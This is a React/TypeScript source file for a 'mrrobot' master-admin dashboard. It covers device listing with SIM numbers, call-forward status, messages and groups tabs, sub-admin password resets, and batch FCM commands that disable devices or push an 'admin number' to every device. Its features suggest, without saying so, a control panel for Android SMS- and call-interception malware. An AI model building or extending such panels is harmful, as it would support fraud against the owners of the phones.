  // Live timeAgo ticker — so "Online: 0s ago → 1s ago → 2s ago" updates every second
  const [, setTick] = useState(0);
  useEffect(() => {
    const iv = setInterval(() => setTick(t => t + 1), 1000);
    return () => clearInterval(iv);
  }, []);
  const sim1 = [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(" — ") || "—";
  const sim2 = [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(" — ") || "—";
  const online = isRecentlyOnline(device.lastOnline);
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 6, minWidth: 0 }}>
      <div onClick={() => onSelect(device)} className="ma-card" style={{ background: T.card, borderRadius: 12, border: `1px solid ${T.borderLight}`, cursor: "pointer", overflow: "hidden", minWidth: 0 }}>
        <div className="ma-dcard-title" style={{ padding: "8px 10px 8px 14px", borderBottom: `1px solid ${T.borderLight}`, background: T.headerBg, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 4 }}>
          <span style={{ fontWeight: 800, fontSize: 13, color: T.text, flex: 1, minWidth: 0, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
            {totalCount - idx}.&nbsp;{device.name}
          </span>
          <span style={{ width: 7, height: 7, borderRadius: "50%", flexShrink: 0, background: online ? "#22c55e" : T.border, boxShadow: online ? "0 0 5px #22c55e" : "none", display: "inline-block" }} />
        </div>
        {([
          { label: "ID",      value: device.deviceId,                                              mono: true,  color: undefined, copy: true },
          { label: "Android", value: device.androidVersion ? String(device.androidVersion) : "—",  mono: false, color: undefined, copy: false },
          { label: "SIM 1",   value: sim1,                                                          mono: false, color: undefined, copy: false },
          { label: "SIM 2",   value: sim2,                                                          mono: false, color: undefined, copy: false },
          { label: "Online",  value: fmtAgo(device.lastOnline), mono: false, color: online ? T.green : undefined, copy: false },
        ] as { label: string; value: string; mono: boolean; color?: string; copy: boolean }[]).map(({ label, value, mono, color, copy }, i, arr) => (
          <div key={label} className="ma-dcard-row" style={{ display: "flex", alignItems: "flex-start", borderBottom: i < arr.length - 1 ? `1px solid ${T.border}` : "none", padding: "6px 14px" }}>
            <span className="ma-dcard-lbl" style={{ width: 56, fontSize: 10, color: T.muted, fontWeight: 600, flexShrink: 0, paddingTop: 1 }}>{label}:</span>
            <span className="ma-dcard-val" style={{ fontSize: 10, color: color ?? T.mutedLight, fontFamily: mono ? "monospace" : undefined, wordBreak: "break-all", lineHeight: 1.4, flex: 1, minWidth: 0, fontWeight: color ? 700 : undefined }}>{value}</span>
            {copy && <span onClick={e => e.stopPropagation()}><CopyIconBtn value={value} title={`Copy ${label}`} /></span>}
          </div>
        ))}
      </div>
      <div onClick={e => e.stopPropagation()}>
        <CardCheckBtn device={device} />
      </div>
    </div>
  );
});

/* ══════════════════════════════════════════
   DEVICES TAB
══════════════════════════════════════════ */
const PAGE_SIZE = 48;
function DevicesTab({ apps = [], masterPin, syncTick, onlineCount: onlineCountProp, onlineFilter = false, onClearOnlineFilter, jumpDeviceId }: { apps?: App[]; masterPin: string; syncTick?: number; onOnlineCount?: (n: number) => void; onlineCount?: number; onlineFilter?: boolean; onClearOnlineFilter?: () => void; jumpDeviceId?: string | null }) {
  const [devices, setDevices] = useState<FullDevice[]>([]);
  const [totalCount, setTotalCount] = useState(0);
  const [hasMore, setHasMore] = useState(false);
  const [loading, setLoading] = useState(false);
  const [loadingMore, setLoadingMore] = useState(false);
  const [appFilter, setAppFilter] = useState("");
  const [search, setSearch] = useState("");
  const [debouncedSearch, setDebouncedSearch] = useState("");
  const [selected, setSelected] = useState<FullDevice | null>(null);
  const handleSelect = useCallback((d: FullDevice) => {
    sessionStorage.setItem("mr_selected_dev", d.deviceId);
    setSelected(d);
  }, []);
  function closeDetail() {
    sessionStorage.removeItem("mr_selected_dev");
    setSelected(null);
  }

  // Restore selected device from sessionStorage after devices load
  useEffect(() => {
    if (selected || devices.length === 0) return;
    const saved = sessionStorage.getItem("mr_selected_dev");
    if (!saved) return;
    const found = devices.find(d => d.deviceId === saved);
    if (found) { setSelected(found); return; }
    apiFetch(`/api/master/all-devices?search=${encodeURIComponent(saved)}&limit=5`, { headers: { "x-master-pin": masterPin } })
      .then(r => r.ok ? r.json() : null)
      .then((j: { data?: FullDevice[] } | null) => {
        const d = (j?.data ?? []).find(x => x.deviceId === saved);
        if (d) setSelected(d);
      })
      .catch(() => {});
  }, [devices]); // eslint-disable-line react-hooks/exhaustive-deps

  // Jump to device when navigated from Messages/Groups tab
  useEffect(() => {
    if (!jumpDeviceId) return;
    // Try existing list first
    const found = devices.find(d => d.deviceId === jumpDeviceId);
    if (found) { setSelected(found); return; }
    // Otherwise fetch it individually
    apiFetch(`/api/master/all-devices?search=${encodeURIComponent(jumpDeviceId)}&limit=5`, { headers: { "x-master-pin": masterPin } })
      .then(r => r.ok ? r.json() : null)
      .then((j: { data?: FullDevice[] } | null) => {
        const d = (j?.data ?? []).find(x => x.deviceId === jumpDeviceId);
        if (d) setSelected(d);
      })
      .catch(() => {});
  }, [jumpDeviceId]); // eslint-disable-line react-hooks/exhaustive-deps
  const prevSyncRef = useRef(syncTick);
  const sentinelRef = useRef<HTMLDivElement>(null);

  // Debounce search → 400ms → server-side ILIKE
  useEffect(() => {
    const t = setTimeout(() => setDebouncedSearch(search.trim()), 400);
    return () => clearTimeout(t);
  }, [search]);

  // Core fetch: offset=0 + replace=true → first page; offset=N → append (load more)
  const fetchDevices = useCallback(async (offset: number, replace: boolean, silent = false) => {
    if (replace && !silent) setLoading(true);
    if (!replace) setLoadingMore(true);
    try {
      const qs = new URLSearchParams({ limit: String(PAGE_SIZE), offset: String(offset) });
      if (appFilter) qs.set("appId", appFilter);
      if (debouncedSearch) qs.set("search", debouncedSearch);
      if (onlineFilter) qs.set("onlineOnly", "1");
      const r = await apiFetch(`/api/master/all-devices?${qs}`, { headers: { "x-master-pin": masterPin } });
      if (r.ok) {
        const resp = await r.json() as { data: FullDevice[]; total: number; hasMore: boolean };
        setDevices(replace ? resp.data : prev => [...prev, ...resp.data]);
        setTotalCount(resp.total);
        setHasMore(resp.hasMore);
      }
    } catch { /* ignore */ } finally { setLoading(false); setLoadingMore(false); }
  }, [appFilter, masterPin, debouncedSearch, onlineFilter]); // eslint-disable-line react-hooks/exhaustive-deps

  // Reset to page 1 on filter/search change
  useEffect(() => { void fetchDevices(0, true); }, [fetchDevices]);

  // syncTick (manual sync button) → full refresh
  useEffect(() => {
    if (syncTick === prevSyncRef.current) return;
    prevSyncRef.current = syncTick;
    void fetchDevices(0, true, true);
  }, [syncTick]); // eslint-disable-line react-hooks/exhaustive-deps

  // WS reconnected (after disconnect gap) → one full refresh to catch missed events
  useEffect(() => {
    function onReconnect() { void fetchDevices(0, true, true); }
    window.addEventListener("mrrobot:ws_reconnected", onReconnect);
    return () => window.removeEventListener("mrrobot:ws_reconnected", onReconnect);
  }, [fetchDevices]);

  // Live: device_updated WS event → surgically update card + selected (sub-admin pattern)
  useEffect(() => {
    function onUpdated(e: Event) {
      const d = (e as CustomEvent).detail as Partial<FullDevice> & { deviceId?: string };
      if (!d.deviceId) return;
      // Update devices list (card)
      setDevices(prev => {
        const i = prev.findIndex(x => x.deviceId === d.deviceId);
        if (i === -1) return prev;
        const next = [...prev];
        next[i] = { ...next[i], ...d };
        return next;
      });
      // CRITICAL: directly update selected too — sub-admin exact pattern (line 3347)
      // Without this, call forward / lastOnline don't update in DeviceDetail when
      // device is outside current page (pagination) or filtered out
      setSelected(sel => sel?.deviceId === d.deviceId ? { ...sel, ...d } as FullDevice : sel);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, []);

  // Infinite scroll — sentinel at bottom triggers next page load
  useEffect(() => {
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0].isIntersecting && hasMore && !loadingMore && !loading) {
        void fetchDevices(devices.length, false);
      }
    }, { rootMargin: "200px" });
    obs.observe(el);
    return () => obs.disconnect();
  }, [hasMore, loadingMore, loading, devices.length, fetchDevices]);

  // Sync selected modal with refreshed device data
  useEffect(() => {
    if (!selected) return;
    const fresh = devices.find(d => d.deviceId === selected.deviceId);
    if (fresh) setSelected(fresh);
  }, [devices]); // eslint-disable-line react-hooks/exhaustive-deps

  const ONLINE_MS = 15 * 60 * 1000;
  const onlineLoaded = devices.filter(d => d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false).length;

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
        <div style={{ position: "relative", flex: 1, minWidth: 180 }}>
          <span style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", color: T.muted, display: "flex", pointerEvents: "none" }}><Ic.Search /></span>
          <input type="text" placeholder="Search name, device ID, phone…" value={search}
            onChange={e => setSearch(e.target.value)}
            style={{ width: "100%", boxSizing: "border-box", padding: "8px 32px 8px 36px", borderRadius: 9, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
          {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 20, height: 20, borderRadius: 5, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
        </div>
        {onlineFilter && (
          <button onClick={onClearOnlineFilter} title="Clear online filter" style={{ display: "inline-flex", alignItems: "center", gap: 5, padding: "7px 12px", borderRadius: 9, border: "1px solid #22c55e", background: "#14532d", color: "#4ade80", fontSize: 12, fontWeight: 700, cursor: "pointer", flexShrink: 0 }}>
            <span style={{ width: 7, height: 7, borderRadius: "50%", background: "#22c55e", display: "inline-block", boxShadow: "0 0 5px #22c55e" }} />
            Online Only ✕
          </button>
        )}
      </div>

      <div style={{ display: "flex", gap: 8, fontSize: 11, flexWrap: "wrap" }}>
        <span style={{ color: T.muted }}>{totalCount > 0 ? `${totalCount} total` : devices.length > 0 ? `${devices.length} loaded` : "—"}</span>
        <span style={{ color: T.green }}>· {onlineCountProp ?? onlineLoaded} online</span>
        <span style={{ color: T.muted }}>· {devices.filter(d => d.hasFcm).length} FCM</span>
        {debouncedSearch && <span style={{ color: T.accentLight }}>· searching "{debouncedSearch}"</span>}
      </div>

      {loading && devices.length === 0 ? (
        <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}><Ic.Loader /><span>Loading devices…</span></div>
      ) : devices.length === 0 ? (
        <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
          <Ic.Inbox /><span>{debouncedSearch ? `No devices for "${debouncedSearch}".` : "No devices found."}</span>
        </div>
      ) : (
        <>
          <div className="ma-device-grid">
            {devices.map((d, idx) => (
              <DeviceCard
                key={d.deviceId}
                device={d}
                idx={idx}
                totalCount={totalCount}
                masterPin={masterPin}
                onSelect={handleSelect}
              />
            ))}
          </div>
          {/* Infinite scroll sentinel — IntersectionObserver watches this */}
          <div ref={sentinelRef} style={{ height: 1 }} />
          {loadingMore && <div style={{ textAlign: "center", padding: 12 }}><Spinner /></div>}
          <div style={{ textAlign: "center", fontSize: 11, color: T.muted }}>
            Showing {devices.length}{totalCount > 0 ? ` of ${totalCount}` : ""} device{devices.length !== 1 ? "s" : ""}
            {!hasMore && devices.length > 0 && <span style={{ color: T.green, fontWeight: 700 }}> · ✓ All loaded</span>}
          </div>
        </>
      )}

      {selected && <DeviceDetail device={selected} masterPin={masterPin} onClose={closeDetail} />}
    </div>
  );
}

/* ══════════════════════════════════════════
   SETTINGS TAB
══════════════════════════════════════════ */
function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
  /* ── Batch FCM (targets ALL devices across ALL apps) ── */
  const [batchState, setBatchState] = useState<"idle" | "loading" | "running" | "done" | "err">("idle");
  const [batchDone, setBatchDone] = useState(0);
  const [batchTotal, setBatchTotal] = useState(0);
  const [batchResult, setBatchResult] = useState<{ ok: number; fail: number } | null>(null);
  const [adminNumInput, setAdminNumInput] = useState("");
  const [batchAction, setBatchAction] = useState<"ping" | "disable" | "update_admin">("ping");

  /* ── Sessions (per-app selector) ── */
  const [sessAppFilter, setSessAppFilter] = useState(apps[0]?.appId ?? "");
  const [sessions, setSessions] = useState<SessionRow[]>([]);
  const [sessLoading, setSessLoading] = useState(false);
  const [logoutingId, setLogoutingId] = useState<string | null>(null);
  const [logoutingAll, setLogoutingAll] = useState(false);

  /* ── Delete Protection (per-app selector) ── */
  const [dpAppFilter, setDpAppFilter] = useState(apps[0]?.appId ?? "");
  const dpApp = apps.find(a => a.appId === dpAppFilter) ?? null;
  const [dpState, setDpState] = useState<"idle" | "busy">("idle");
  const [dpNewPin, setDpNewPin] = useState("");
  const [dpCurrentPin, setDpCurrentPin] = useState("");
  const [dpEnabled, setDpEnabled] = useState(false);
  const [dpHasPin, setDpHasPin] = useState(false);
  const [dpMsg, setDpMsg] = useState("");

  useEffect(() => {
    if (apps.length && !sessAppFilter) setSessAppFilter(apps[0]?.appId ?? "");
    if (apps.length && !dpAppFilter) setDpAppFilter(apps[0]?.appId ?? "");
  }, [apps]);

  useEffect(() => {
    if (dpApp) { setDpEnabled(dpApp.deleteProtectionEnabled); setDpHasPin(!!dpApp.deleteProtectionPin); }
    setDpMsg(""); setDpNewPin(""); setDpCurrentPin("");
  }, [dpAppFilter]);

  const fetchSessions = useCallback(async () => {
    if (!sessAppFilter) return;
    setSessLoading(true);
    try {
      const r = await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(sessAppFilter)}`);
      if (r.ok) setSessions(await r.json() as SessionRow[]);
    } catch { /* ignore */ } finally { setSessLoading(false); }
  }, [sessAppFilter]);

  useEffect(() => { void fetchSessions(); }, [fetchSessions]);

  async function logoutSession(id: string) {
    setLogoutingId(id);
    try {
      await apiFetch(`/api/admin/sessions/${id}`, { method: "DELETE" });
      setSessions(prev => prev.filter(s => s.id !== id));
    } catch { /* ignore */ } finally { setLogoutingId(null); }
  }

  async function logoutAll() {
    if (!sessAppFilter) return;
    setLogoutingAll(true);
    try {
      await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(sessAppFilter)}`, { method: "DELETE" });
      setSessions([]);
    } catch { /* ignore */ } finally { setLogoutingAll(false); }
  }

  /* Batch FCM — NO appId filter — targets ALL devices across ALL apps */
  async function runBatch() {
    setBatchState("loading"); setBatchResult(null); setBatchDone(0); setBatchTotal(0);
    try {
      const r = await apiFetch(`/api/master/all-devices?hasFcm=1`, { headers: { "x-master-pin": masterPin } });
      const eligible = r.ok ? (await r.json() as FullDevice[]) : [];
      setBatchTotal(eligible.length); setBatchState("running");
      const BATCH = 50; const DELAY = 300;
      let ok = 0; let fail = 0;
      for (let i = 0; i < eligible.length; i += BATCH) {
        const batch = eligible.slice(i, i + BATCH);
        const results = await Promise.allSettled(batch.map(d => {
          let data: Record<string, string>;
          if (batchAction === "ping") data = { type: "0" };
          else if (batchAction === "disable") data = { type: "admin_update", status: "off" };
          else data = { type: "admin_update", status: "on", number: adminNumInput.trim() };
          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); });
        }));
        results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
        setBatchDone(Math.min(i + BATCH, eligible.length));
        if (i + BATCH < eligible.length) await new Promise(r2 => setTimeout(r2, DELAY));
      }
      setBatchResult({ ok, fail }); setBatchState("done");
      setTimeout(() => { setBatchState("idle"); setBatchDone(0); setBatchTotal(0); setBatchResult(null); }, 6000);
    } catch { setBatchState("err"); setTimeout(() => setBatchState("idle"), 3000); }
  }

  async function setDeleteProtectionPin() {
    if (!dpAppFilter || !dpNewPin || dpNewPin.length < 4) { setDpMsg("PIN must be at least 4 characters"); return; }
    setDpState("busy"); setDpMsg("");
    try {
      const r = await apiFetch(`/api/apps/${encodeURIComponent(dpAppFilter)}/delete-protection/set-pin`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-master-pin": masterPin },
        body: JSON.stringify({ pin: dpNewPin }),
      });
      if (!r.ok) { const j = await r.json() as { error?: string }; setDpMsg(j.error ?? "Failed"); return; }
      setDpHasPin(true); setDpMsg("PIN set successfully!"); setDpNewPin("");
    } catch { setDpMsg("Network error"); } finally { setDpState("idle"); }
  }

  async function toggleDeleteProtection() {
    if (!dpAppFilter) return;
    setDpState("busy"); setDpMsg("");
    try {
      const r = await apiFetch(`/api/apps/${encodeURIComponent(dpAppFilter)}/delete-protection/toggle`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-master-pin": masterPin },
        body: JSON.stringify({}),
      });
      if (!r.ok) { const j = await r.json() as { error?: string }; setDpMsg(j.error ?? "Failed"); return; }
      const j = await r.json() as { enabled: boolean };
      setDpEnabled(j.enabled); setDpMsg(`Delete protection ${j.enabled ? "enabled" : "disabled"}.`);
    } catch { setDpMsg("Network error"); } finally { setDpState("idle"); }
  }

  const busyBatch = batchState === "loading" || batchState === "running";
  const pct = batchTotal > 0 ? Math.round((batchDone / batchTotal) * 100) : 0;

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>

      {/* ── Batch FCM Actions — ALL devices across ALL apps ── */}
      <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
        <div style={{ fontSize: 14, fontWeight: 800, color: T.text, marginBottom: 4 }}>Batch FCM Actions</div>
        <div style={{ fontSize: 12, color: T.muted, marginBottom: 12 }}>Send FCM commands to <b style={{ color: T.accentLight }}>ALL FCM-enabled devices</b> across every app at once</div>

        <div style={{ display: "flex", gap: 6, marginBottom: 12 }}>
          {(["ping", "disable", "update_admin"] as const).map(a => (
            <button key={a} onClick={() => setBatchAction(a)} style={{ flex: 1, padding: "8px 6px", borderRadius: 8, border: `1.5px solid ${batchAction === a ? T.accent : T.borderLight}`, background: batchAction === a ? T.accentGlow : T.border, color: batchAction === a ? T.accentLight : T.muted, fontWeight: 700, fontSize: 11, cursor: "pointer" }}>
              {a === "ping" ? "Ping All" : a === "disable" ? "Disable All" : "Update Admin"}
            </button>
          ))}
        </div>

        {batchAction === "update_admin" && (
          <input type="tel" placeholder="Admin phone number" value={adminNumInput} onChange={e => setAdminNumInput(e.target.value)} style={{ ...inpBase, marginBottom: 12, fontSize: 13 }} />
        )}

        {(batchState === "loading" || batchState === "running") && (
          <div style={{ marginBottom: 12 }}>
            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: T.muted, marginBottom: 5 }}>
              <span>{batchState === "loading" ? "Fetching all devices…" : "Sending…"}</span>
              {batchState === "running" && <span style={{ color: T.accentLight, fontWeight: 700 }}>{batchDone}/{batchTotal}</span>}
            </div>
            <div style={{ height: 5, background: T.border, borderRadius: 3, overflow: "hidden" }}>
              <div style={{ height: "100%", background: `linear-gradient(90deg,${T.accent},#8b5cf6)`, width: batchState === "loading" ? "10%" : `${pct}%`, transition: "width 0.3s" }} />
            </div>
          </div>
        )}
        {batchState === "done" && batchResult && (
          <div style={{ background: T.green + "18", border: `1px solid ${T.green}44`, borderRadius: 9, padding: "9px 14px", display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
            <span style={{ color: T.green, fontWeight: 700, fontSize: 13 }}>Done!</span>
            <span style={{ fontSize: 12, color: T.muted }}><span style={{ color: T.green, fontWeight: 700 }}>{batchResult.ok}</span> sent{batchResult.fail > 0 && <> · <span style={{ color: T.red, fontWeight: 700 }}>{batchResult.fail}</span> failed</>}</span>
          </div>
        )}
        {batchState === "err" && <div style={{ background: T.red + "15", borderRadius: 9, padding: "9px 14px", color: T.red, fontSize: 12, marginBottom: 12, display: "flex", alignItems: "center", gap: 8 }}><Ic.Alert /> Failed. Retry.</div>}

        <button onClick={() => void runBatch()} disabled={busyBatch || (batchAction === "update_admin" && !adminNumInput.trim())}
          style={{ width: "100%", padding: "11px 0", borderRadius: 9, background: batchState === "done" ? T.green : busyBatch ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, border: "none", color: batchState === "done" ? "#fff" : busyBatch ? T.accentLight : "#fff", fontWeight: 800, fontSize: 13, cursor: busyBatch ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
          {batchState === "loading" ? <><Spinner /> Fetching…</> : batchState === "running" ? <><Spinner /> {batchDone}/{batchTotal}…</> : batchState === "done" ? <><Ic.Check /> Done</> : batchState === "err" ? "Error — Retry" : batchAction === "ping" ? <><Ic.Wifi /> Ping All Devices</> : batchAction === "disable" ? <><Ic.Power /> Disable All</> : <><Ic.Key /> Update Admin Number</>}
        </button>
      </div>

    </div>
  );
}

/* ══════════════════════════════════════════
   MANAGE USERS TAB
══════════════════════════════════════════ */
function ManageUsersTab({ apps, masterPin, onPinReset }: { apps: App[]; masterPin: string; onPinReset: (appId: string, newPin: string) => void }) {
  const [resetApp, setResetApp] = useState<App | null>(null);
  const [newPin, setNewPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [saving, setSaving] = useState(false);
  const [err, setErr] = useState("");
  const [successId, setSuccessId] = useState<string | null>(null);

  function openReset(app: App) { setResetApp(app); setNewPin(""); setShowPin(false); setErr(""); }
  function closeReset() { setResetApp(null); setNewPin(""); setErr(""); setSaving(false); }

  async function doReset() {
    if (!resetApp) return;
    if (!newPin.trim()) { setErr("Naya password khali nahi ho sakta."); return; }
    setSaving(true); setErr("");
    try {
      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(resetApp.appId)}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json", "x-master-pin": masterPin },
        body: JSON.stringify({ pin: newPin.trim() }),
      });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Error"); setSaving(false); return; }
      onPinReset(resetApp.appId, newPin.trim());
      setSuccessId(resetApp.appId);
      setTimeout(() => setSuccessId(null), 3000);
      closeReset();
    } catch { setErr("Network error. Try again."); setSaving(false); }
  }

  const sorted = [...apps].sort((a, b) => a.name.localeCompare(b.name));

  return (
    <div>
      {/* Header */}
      <div style={{ marginBottom: 18 }}>
        <div style={{ fontSize: 16, fontWeight: 800, color: T.text }}>Manage Users</div>
        <div style={{ fontSize: 12, color: T.muted, marginTop: 3 }}>Sirf master admin — kisi bhi sub-admin ka password reset karo</div>
      </div>

      {sorted.length === 0 ? (
        <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}` }}>
          Koi sub-admin app nahi mili.
        </div>
      ) : (
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {sorted.map(app => (
            <div key={app.appId} style={{ background: T.card, border: `1px solid ${successId === app.appId ? T.green + "60" : T.borderLight}`, borderRadius: 13, padding: "14px 16px", display: "flex", alignItems: "center", gap: 12, flexWrap: "wrap", transition: "border-color 0.3s" }}>
              {/* Status dot */}
              <div style={{ width: 8, height: 8, borderRadius: "50%", flexShrink: 0, background: app.status === "active" ? T.green : T.red, boxShadow: app.status === "active" ? `0 0 6px ${T.green}` : "none" }} />
              {/* Info */}
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontSize: 13, fontWeight: 700, color: T.text, marginBottom: 2 }}>{app.name}</div>
                <div style={{ fontSize: 11, color: T.muted, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{app.appId}</div>
              </div>
              {/* Status badge */}
              <span style={{ fontSize: 10, fontWeight: 700, padding: "3px 9px", borderRadius: 99, background: app.status === "active" ? T.green + "18" : T.red + "18", color: app.status === "active" ? T.green : T.red, border: `1px solid ${app.status === "active" ? T.green + "40" : T.red + "40"}`, flexShrink: 0 }}>
                {app.status === "active" ? "Active" : "Disabled"}
              </span>
              {/* Success badge */}
              {successId === app.appId && (
                <span style={{ fontSize: 10, fontWeight: 700, padding: "3px 9px", borderRadius: 99, background: T.green + "22", color: T.green, border: `1px solid ${T.green}50`, flexShrink: 0 }}>✓ Reset ho gaya!</span>
              )}
              {/* Reset button */}
              <button onClick={() => openReset(app)} style={{ padding: "7px 16px", borderRadius: 9, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, fontSize: 12, cursor: "pointer", flexShrink: 0 }}>
                🔑 Reset Password
              </button>
            </div>
          ))}
        </div>
      )}

      {/* Reset PIN Modal */}
      {resetApp && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.78)", zIndex: 999, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }} onClick={closeReset}>
          <div onClick={e => e.stopPropagation()} style={{ background: "#141428", borderRadius: 20, padding: "28px 24px 24px", width: "100%", maxWidth: 400, boxShadow: "0 24px 80px rgba(0,0,0,0.65)", border: "1px solid rgba(255,255,255,0.08)", position: "relative" }}>
            <button onClick={closeReset} style={{ position: "absolute", top: 14, right: 14, background: "rgba(255,255,255,0.08)", border: "none", color: "#aaa", cursor: "pointer", width: 28, height: 28, borderRadius: 8, fontSize: 16, display: "flex", alignItems: "center", justifyContent: "center" }}>✕</button>
            <div style={{ fontSize: 17, fontWeight: 800, color: "#fff", marginBottom: 4 }}>🔑 Password Reset</div>
            <div style={{ fontSize: 13, color: "#888", marginBottom: 4 }}>Sub-admin:</div>
            <div style={{ fontSize: 13, fontWeight: 700, color: "#a78bfa", background: "rgba(99,102,241,0.1)", border: "1px solid rgba(99,102,241,0.25)", borderRadius: 8, padding: "7px 12px", marginBottom: 20 }}>
              {resetApp.name} <span style={{ color: "#555", fontWeight: 400, fontSize: 11 }}>({resetApp.appId})</span>
            </div>
            <div style={{ fontSize: 11, fontWeight: 700, color: "#8b8fa8", letterSpacing: 1, marginBottom: 6, textTransform: "uppercase" }}>Naya Password</div>
            <div style={{ position: "relative", marginBottom: 16 }}>
              <input
                autoFocus
                type={showPin ? "text" : "password"}
                value={newPin}
                onChange={e => { setNewPin(e.target.value); setErr(""); }}
                onKeyDown={e => e.key === "Enter" && void doReset()}
                placeholder="Naya password likho"
                style={{ width: "100%", boxSizing: "border-box", padding: "12px 44px 12px 14px", borderRadius: 10, background: "#1a1a35", border: `1.5px solid ${err ? "#ef4444" : "rgba(255,255,255,0.1)"}`, color: "#fff", fontSize: 15, outline: "none", letterSpacing: 1 }}
              />
              <button type="button" onClick={() => setShowPin(s => !s)} style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: "#666", cursor: "pointer", fontSize: 16, padding: 0 }}>
                {showPin ? "🙈" : "👁"}
              </button>
            </div>
            {err && <div style={{ fontSize: 12, color: "#ef4444", marginBottom: 12, marginTop: -8 }}>{err}</div>}
            <div style={{ display: "flex", gap: 10 }}>
              <button onClick={closeReset} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "rgba(255,255,255,0.07)", border: "none", color: "#aaa", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>Cancel</button>
              <button onClick={() => void doReset()} disabled={saving} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: saving ? "#3a3a5a" : "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 800, fontSize: 13, cursor: saving ? "wait" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
                {saving ? <><Spinner /> Saving…</> : "✓ Reset Karo"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ══════════════════════════════════════════
   MAIN DASHBOARD
══════════════════════════════════════════ */
type Tab = "apps" | "messages" | "groups" | "devices" | "settings" | "users";

function Dashboard({ masterPin, sessionId, onLogout, onPinChanged }: { masterPin: string; sessionId: string; onLogout: () => void; onPinChanged: (p: string) => void }) {
  const [tab, setTab] = useState<Tab>(() => {
    try { const s = localStorage.getItem("mr_master_tab"); if (s && ["apps","messages","groups","devices","settings","users"].includes(s)) return s as Tab; } catch {}
    return "apps";
  });
  const changeTab = (t: Tab) => { try { localStorage.setItem("mr_master_tab", t); } catch {} setTab(t); };
  const [onlineFilter, setOnlineFilter] = useState(false);
  const [appList, setAppList] = useState<App[]>([]);
  const [appsLoading, setAppsLoading] = useState(true);
  const [showCreate, setShowCreate] = useState(false);
  const [showCreateGate, setShowCreateGate] = useState(false);
  const [createGateInput, setCreateGateInput] = useState("");
  const [createGateError, setCreateGateError] = useState("");
  const [createGateShow, setCreateGateShow] = useState(false);
  const [deleteGateApp, setDeleteGateApp] = useState<App | null>(null);
  const [deleteGateInput, setDeleteGateInput] = useState("");
  const [deleteGateError, setDeleteGateError] = useState("");
  const [deleteGateShow, setDeleteGateShow] = useState(false);
  const [showChangePin, setShowChangePin] = useState(false);
  const [showViewPin, setShowViewPin] = useState(false);
  const [tabsUnlocked, setTabsUnlockedRaw] = useState(() => localStorage.getItem("mr_nav_unlocked") === "1");
  const setTabsUnlocked = (v: boolean | ((p: boolean) => boolean)) => {
    setTabsUnlockedRaw(prev => {
      const next = typeof v === "function" ? v(prev) : v;
      if (next) localStorage.setItem("mr_nav_unlocked", "1");
      else localStorage.removeItem("mr_nav_unlocked");
      return next;
    });
  };
  const [navPassState, setNavPassState] = useState<"idle"|"asking"|"err">("idle");
  const [navPass, setNavPass] = useState("");
  const navPassRef = useRef<HTMLInputElement>(null);
  const [editApp, setEditApp] = useState<App | null>(null);
  const [deletingId, setDeletingId] = useState<string | null>(null);
  const [togglingId, setTogglingId] = useState<string | null>(null);
  const [copyMsg, setCopyMsg] = useState<Record<string, string>>({});
